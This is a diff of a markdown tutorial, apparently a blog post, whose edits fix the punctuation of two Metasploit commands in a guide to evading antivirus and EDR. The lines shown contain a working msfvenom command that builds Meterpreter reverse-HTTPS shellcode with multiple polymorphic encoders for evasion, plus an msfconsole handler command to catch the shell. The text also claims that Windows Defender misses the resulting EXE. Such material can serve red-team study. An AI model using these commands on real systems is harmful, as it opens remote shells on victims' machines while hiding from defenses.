@@ -27,7 +27,7 @@ cat rsaprivate.key servercertificate.crt > my.pem
 Generate a Metasploit stager using the certificate and making almost obfuscated using **shikata_ga_nai** for implementing a polymorphic XOR additive feedback encoder.
 
 ```
-msfvenom -p windows/meterpreter/reverse_winhttps LHOST=192.168.1.46 LPORT=8888 — platform windows -a x86 HandlerSSLCert=./my.pem StagerVerifySSLCert=true -s 42 — smallest -e x86/shikata_ga_nai -i 9 -f raw| msfvenom — platform windows -a x86 -e x86/call4_dword_xor -i 6 -b “\x00\x0a\x0d” -f raw > shellcode.raw
+msfvenom -p windows/meterpreter/reverse_winhttps LHOST=192.168.1.46 LPORT=8888 --platform windows -a x86 HandlerSSLCert=./my.pem StagerVerifySSLCert=true -s 42 --smallest -e x86/shikata_ga_nai -i 9 -f raw| msfvenom --platform windows -a x86 -e x86/call4_dword_xor -i 6 -b "\x00\x0a\x0d" -f raw > shellcode.raw
 ```
 
 ![encoding_shellcode_with_9_iterations](https://miro.medium.com/max/700/1*r_Mn2ruiyf-OQ_q2kEOXuQ.png)
@@ -69,7 +69,7 @@ The EXE is generated and ready to evade modern EDRs and Windows Defender. Let’
 It is bypassed, no detection at all. Now it’s time to set a listener in Metasploit and hopefully get a shell:
 
 ```
-msfconsole -q -x ‘use exploit/multi/handler; set ExitOnSession false; set PAYLOAD windows/meterpreter/reverse_winhttps; set LHOST 192.168.1.46; set LPORT 8888; set HandlerSSLCert /home/nade/Desktop/my.pem; set StagerVerifySSLCert true; set SessionCommunicationTimeout 600; run -j -z’
+msfconsole -q -x 'use exploit/multi/handler; set ExitOnSession false; set PAYLOAD windows/meterpreter/reverse_winhttps; set LHOST 192.168.1.46; set LPORT 8888; set HandlerSSLCert /home/nade/Desktop/my.pem; set StagerVerifySSLCert true; set SessionCommunicationTimeout 600; run -j -z'
 ```
 
 For the sake of the statistics, this is the detection rate when scanning in various AVs:
